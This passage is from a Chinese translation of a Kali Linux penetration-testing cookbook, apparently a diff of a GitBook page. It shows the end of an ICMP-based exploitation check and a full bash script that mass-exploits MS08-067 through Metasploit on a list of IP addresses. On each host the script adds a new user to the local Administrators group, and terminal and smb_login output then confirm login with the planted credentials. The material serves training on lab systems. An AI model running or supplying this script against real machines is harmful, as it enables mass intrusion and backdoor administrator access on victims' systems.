+</code></pre><p>Python&#x6D41;&#x91CF;&#x76D1;&#x542C;&#x5668;&#x5E94;&#x8BE5;&#x9996;&#x5148;&#x6267;&#x884C;&#x3002; &#x811A;&#x672C;&#x6700;&#x521D;&#x4E0D;&#x5E94;&#x751F;&#x6210;&#x8F93;&#x51FA;&#x3002; &#x6B64;&#x811A;&#x672C;&#x5E94;&#x8BE5;&#x5728;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x7684;&#x6574;&#x4E2A;&#x65F6;&#x95F4;&#x5185;&#x6301;&#x7EED;&#x8FD0;&#x884C;&#x3002; &#x4E00;&#x65E6;&#x811A;&#x672C;&#x8FD0;&#x884C;&#xFF0C;&#x5E94;&#x8BE5;&#x542F;&#x52A8; bash &#x5229;&#x7528;&#x811A;&#x672C;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./multipwn.sh iplist.txt 
+Exploiting 172.16.36.132 and pinging 
+Exploiting 172.16.36.158 and pinging 
+Exploiting 172.16.36.225 and pinging
+</code></pre><p>&#x5F53;&#x6267;&#x884C;&#x811A;&#x672C;&#x65F6;&#xFF0C;&#x539F;&#x59CB;&#x7EC8;&#x7AEF; shell &#x4F1A;&#x663E;&#x793A;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x6B63;&#x5728;&#x88AB;&#x5229;&#x7528;&#xFF0C;&#x5E76;&#x4E14;&#x6B63;&#x5728;&#x6267;&#x884C;<code>ping</code>&#x5E8F;&#x5217;&#x3002; &#x8FD8;&#x5C06;&#x4E3A;&#x8F93;&#x5165;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A; IP &#x5730;&#x5740;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x65B0;&#x7684; GNOME &#x7EC8;&#x7AEF;&#x3002; &#x5F53;&#x6BCF;&#x4E2A;&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x4ECE;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x53D1;&#x8D77; ICMP &#x56DE;&#x54CD;&#x8BF7;&#x6C42;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./listener.py 
+Listening for Incoming ICMP Traffic. Use Ctrl+C to stop scanning 
+172.16.36.132 is exploitable 
+172.16.36.158 is exploitable 
+172.16.36.225 is exploitable
+</code></pre><p>&#x5047;&#x8BBE;&#x653B;&#x51FB;&#x6210;&#x529F;&#xFF0C;Python &#x76D1;&#x542C;&#x811A;&#x672C;&#x4F1A;&#x8BC6;&#x522B;&#x751F;&#x6210;&#x7684;&#x6D41;&#x91CF;&#xFF0C;&#x5E76;&#x5C06; ICMP &#x6D41;&#x91CF;&#x7684;&#x6BCF;&#x4E2A;&#x6E90; IP &#x5730;&#x5740;&#x5217;&#x4E3A;&#x53EF;&#x5229;&#x7528;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>ICMP &#x6D41;&#x91CF;&#x4F3C;&#x4E4E;&#x662F;&#x4E00;&#x79CD;&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684;&#x53EF;&#x5229;&#x7528;&#x6027;&#x7684;&#x975E;&#x76F4;&#x89C2;&#x65B9;&#x5F0F;&#x3002; &#x7136;&#x800C;&#xFF0C;&#x5B83;&#x5B9E;&#x9645;&#x4E0A;&#x5DE5;&#x4F5C;&#x5F97;&#x5F88;&#x597D;&#x3002; &#x5355;&#x4E2A; ICMP &#x56DE;&#x54CD;&#x8BF7;&#x6C42;&#x5728;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x6CA1;&#x6709;&#x7559;&#x4E0B;&#x4EFB;&#x4F55;&#x5229;&#x7528;&#x7684;&#x75D5;&#x8FF9;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x8FC7;&#x591A;&#x7684;&#x5F00;&#x9500;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x5C06; TTL &#x503C;&#x8BBE;&#x4E3A; 15 &#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x4EA7;&#x751F;&#x8BEF;&#x62A5;&#xFF0C;&#x56E0;&#x4E3A;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x7CFB;&#x7EDF;&#x90FD;&#x4EE5; 128 &#x6216;&#x66F4;&#x9AD8;&#x7684;TTL&#x503C;&#x5F00;&#x59CB;&#x3002;</p>
+<h2 id="88-&#x521B;&#x5EFA;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#x7684;&#x591A;&#x7EBF;&#x7A0B;-msf-&#x5229;&#x7528;">8.8 &#x521B;&#x5EFA;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#x7684;&#x591A;&#x7EBF;&#x7A0B; MSF &#x5229;&#x7528;</h2>
+<p>&#x8BE5;&#x79D8;&#x7C4D;&#x5C55;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#xFF0C;&#x5728;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E0A;&#x5229;&#x7528;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5E76;&#x5728;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E0A;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7BA1;&#x7406;&#x5458;&#x5E10;&#x6237;&#x3002; &#x8BE5;&#x6280;&#x672F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x4EE5;&#x540E;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x96C6;&#x6210;&#x7EC8;&#x7AEF;&#x670D;&#x52A1;&#x6216; SMB &#x8BA4;&#x8BC1;&#x6765;&#x8BBF;&#x95EE;&#x6CA6;&#x9677;&#x7684;&#x7CFB;&#x7EDF;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x4F7F;&#x7528;&#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x90FD;&#x5177;&#x6709;&#x53EF;&#x4F7F;&#x7528; Metasploit &#x5229;&#x7528;&#x7684;&#x76F8;&#x540C;&#x6F0F;&#x6D1E;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x590D;&#x5236;&#x4E86;&#x8FD0;&#x884C; Windows XP &#x6F0F;&#x6D1E;&#x7248;&#x672C;&#x7684; VM&#xFF0C;&#x6765;&#x751F;&#x6210; MS08-067 &#x6F0F;&#x6D1E;&#x7684;&#x4E09;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x8FD8;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x7279;&#x522B;&#x662F;&#xFF0C;&#x6B64;&#x811A;&#x672C;&#x53EF;&#x7528;&#x4E8E;&#x901A;&#x8FC7;&#x5F15;&#x7528; IP &#x5730;&#x5740;&#x7684;&#x8F93;&#x5165;&#x5217;&#x8868;&#x6765;&#x5229;&#x7528; MS08-067 NetAPI &#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-sh"><span class="hljs-meta">#!/bin/bash
+</span>
+<span class="hljs-keyword">if</span> [ ! <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: #./script &lt;host file&gt; &lt;username&gt; &lt;password&gt;&quot;</span>; 
+<span class="hljs-built_in">exit</span>; <span class="hljs-keyword">fi</span>
+
+iplist=<span class="hljs-variable">$1</span> 
+user=<span class="hljs-variable">$2</span> 
+pass=<span class="hljs-variable">$3</span>
+
+<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(cat <span class="hljs-variable">$iplist</span>) 
+<span class="hljs-keyword">do</span>   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/<span class="hljs-built_in">exec</span> CMD=<span class="hljs-string">&quot;cmd.exe /c \&quot;net user <span class="hljs-variable">$user</span> <span class="hljs-variable">$pass</span> /add &amp;&amp; net localgroup administrators <span class="hljs-variable">$user</span> /add\&quot;&quot;</span> RHOST=<span class="hljs-variable">$ip</span> E   
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Exploiting <span class="hljs-variable">$ip</span> and adding user <span class="hljs-variable">$user</span>&quot;</span> 
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p>&#x7531;&#x4E8E;&#x8F7D;&#x8377;&#x4E0D;&#x540C;&#xFF0C;&#x6B64;&#x811A;&#x672C;&#x4E0E;&#x4EE5;&#x524D;&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x5229;&#x7528;&#x811A;&#x672C;&#x4E0D;&#x540C;&#x3002; &#x8FD9;&#x91CC;&#xFF0C;&#x5728;&#x6210;&#x529F;&#x5229;&#x7528;&#x65F6;&#x4F1A;&#x4F9D;&#x6B21;&#x6267;&#x884C;&#x4E24;&#x4E2A;&#x547D;&#x4EE4;&#x3002; &#x8FD9;&#x4E24;&#x4E2A;&#x547D;&#x4EE4;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;<code>hutch</code>&#x7684;&#x65B0;&#x7528;&#x6237;&#x5E10;&#x6237;&#xFF0C;&#x5E76;&#x5B9A;&#x4E49;&#x5173;&#x8054;&#x7684;&#x5BC6;&#x7801;&#x3002; &#x7B2C;&#x4E8C;&#x4E2A;&#x547D;&#x4EE4;&#x5C06;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x7528;&#x6237;&#x5E10;&#x6237;&#x6DFB;&#x52A0;&#x5230;&#x672C;&#x5730;<code>Administrators</code>&#x7EC4;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./multipwn.sh 
+Usage: #./script &lt;host file&gt; &lt;username&gt; &lt;password&gt; 
+root@KaliLinux:~# ./multipwn.sh iplist.txt hutch P@33word 
+Exploiting 172.16.36.132 and adding user hutch 
+Exploiting 172.16.36.158 and adding user hutch 
+Exploiting 172.16.36.225 and adding user hutch
+</code></pre><p>&#x5982;&#x679C;&#x5728;&#x4E0D;&#x63D0;&#x4F9B;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8F93;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x8BE5;&#x4F7F;&#x7528;&#x63CF;&#x8FF0;&#x8868;&#x660E;&#xFF0C;&#x8BE5;&#x811A;&#x672C;&#x5E94;&#x8BE5;&#x4EE5;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x6765;&#x6267;&#x884C;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x4E86;&#x5305;&#x542B;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#x5217;&#x8868;&#x7684;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x4E00;&#x65E6;&#x4EE5;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x6267;&#x884C;&#xFF0C;&#x4F1A;&#x5F00;&#x59CB;&#x5F39;&#x51FA;&#x4E00;&#x7CFB;&#x5217;&#x65B0;&#x7684;&#x7EC8;&#x7AEF;&#x3002; &#x8FD9;&#x4E9B;&#x7EC8;&#x7AEF;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x5C06;&#x8FD0;&#x884C;&#x8F93;&#x5165;&#x5217;&#x8868;&#x4E2D;&#x7684; IP &#x5730;&#x5740;&#x4E4B;&#x4E00;&#x7684;&#x5229;&#x7528;&#x5E8F;&#x5217;&#x3002; &#x539F;&#x59CB;&#x6267;&#x884C;&#x7EC8;&#x7AEF;&#x5C06;&#x5728;&#x6267;&#x884C;&#x65F6;&#x8F93;&#x51FA;&#x8FDB;&#x7A0B;&#x5217;&#x8868;&#xFF0C;&#x5E76;&#x663E;&#x662F;&#x5728;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0A;&#x6DFB;&#x52A0;&#x7684;&#x65B0;&#x7528;&#x6237;&#x5E10;&#x6237;&#x3002; &#x5728;&#x6BCF;&#x4E2A;&#x7EC8;&#x7AEF;&#x4E2D;&#x5B8C;&#x6210;&#x5229;&#x7528;&#x5E8F;&#x5217;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BF8;&#x5982; RDP &#x7684;&#x96C6;&#x6210;&#x7EC8;&#x7AEF;&#x670D;&#x52A1;&#xFF0C;&#x6216;&#x901A;&#x8FC7;&#x8FDC;&#x7A0B; SMB &#x8BA4;&#x8BC1;&#x6765;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x3002; &#x4E3A;&#x4E86;&#x6F14;&#x793A;&#x6DFB;&#x52A0;&#x4E86;&#x8BE5;&#x5E10;&#x6237;&#xFF0C;Metasploit SMB_Login &#x8F85;&#x52A9;&#x6A21;&#x5757;&#x7528;&#x4E8E;&#x4F7F;&#x7528;&#x65B0;&#x6DFB;&#x52A0;&#x7684;&#x51ED;&#x636E;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x5230;&#x53D7;&#x653B;&#x51FB;&#x7684;&#x7CFB;&#x7EDF;&#xFF1A;</p>
+<pre><code>msf &gt; use auxiliary/scanner/smb/smb_login 
+msf  auxiliary(smb_login) &gt; set SMBUser hutch 
+SMBUser =&gt; hutch 
+msf  auxiliary(smb_login) &gt; set SMBPass P@33word 
+SMBPass =&gt; P@33word 
+msf  auxiliary(smb_login) &gt; set RHOSTS 172.16.36.225 
+RHOSTS =&gt; 172.16.36.225 
+msf  auxiliary(smb_login) &gt; run
+
+[*] 172.16.36.225:445 SMB - Starting SMB login bruteforce 
+[+] 172.16.36.225:445 - SUCCESSFUL LOGIN (Windows 5.1) hutch :  [STATUS_ SUCCESS] 
+[*] Username is case insensitive 
+[*] Domain is ignored 
+[*] Scanned 1 of 1 hosts (100% complete) 
+[*] Auxiliary module execution completed
+</code></pre><p><code>SMB_Login</code>&#x8F85;&#x52A9;&#x6A21;&#x5757;&#x7684;&#x7ED3;&#x679C;&#x8868;&#x660E;&#xFF0C;&#x4F7F;&#x7528;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x51ED;&#x636E;&#x767B;&#x5F55;&#x6210;&#x529F;&#x3002; &#x7136;&#x540E;&#xFF0C;&#x8FD9;&#x4E2A;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x5E10;&#x6237;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x8FDB;&#x4E00;&#x6B65;&#x7684;&#x6076;&#x610F;&#x76EE;&#x7684;&#xFF0C;&#x6216;&#x8005;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x811A;&#x672C;&#x6765;&#x6D4B;&#x8BD5;&#x5E10;&#x6237;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x6765;&#x9A8C;&#x8BC1;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x901A;&#x8FC7;&#x5728;&#x6BCF;&#x4E2A;&#x5229;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x4E0A;&#x6DFB;&#x52A0;&#x7528;&#x6237;&#x5E10;&#x6237;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x5BF9;&#x8BE5;&#x7CFB;&#x7EDF;&#x6267;&#x884C;&#x540E;&#x7EED;&#x64CD;&#x4F5C;&#x3002; &#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x6709;&#x4F18;&#x70B9;&#x548C;&#x7F3A;&#x70B9;&#x3002; &#x5728;&#x53D7;&#x6CA6;&#x9677;&#x7CFB;&#x7EDF;&#x4E0A;&#x6DFB;&#x52A0;&#x65B0;&#x5E10;&#x6237;&#x6BD4;&#x653B;&#x7834;&#x73B0;&#x6709;&#x5E10;&#x6237;&#x66F4;&#x5FEB;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x8BBF;&#x95EE;&#x73B0;&#x6709;&#x7684;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#xFF08;&#x5982; RDP&#xFF09;&#x3002; &#x4F46;&#x662F;&#xFF0C;&#x6DFB;&#x52A0;&#x65B0;&#x5E10;&#x6237;&#x5E76;&#x4E0D;&#x975E;&#x5E38;&#x9690;&#x79D8;&#xFF0C;&#x6709;&#x65F6;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;&#x57FA;&#x4E8E;&#x4E3B;&#x673A;&#x7684;&#x5165;&#x4FB5;&#x68C0;&#x6D4B;&#x7CFB;&#x7EDF;&#x7684;&#x8B66;&#x62A5;&#x3002;</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="ch7.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: 第七章 Web 应用扫描">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"第八章 自动化 Kali 工具","level":"1.9","depth":1,"previous":{"title":"第七章 Web 应用扫描","level":"1.8","depth":1,"path":"ch7.md","ref":"ch7.md","articles":[]},"dir":"ltr"},"config":{"plugins":["comment"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"comment":{"highlightCommented":true},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"wizardforcel","pdf":{"pageNumbers":true,"fontSize":16,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Kali Linux 网络扫描秘籍","language":"zh","links":{"sidebar":{"Kali Linux 网络扫描秘籍":"https://www.gitbook.com/book/wizardforcel/kali-linux-network-scanning-cookbook"},"gitbook":true},"gitbook":"*","description":"Kali Linux Network Scanning Cookbook 中文版"},"file":{"path":"ch8.md","mtime":"2016-11-25T09:44:31.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2016-11-26T04:32:05.478Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-comment/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
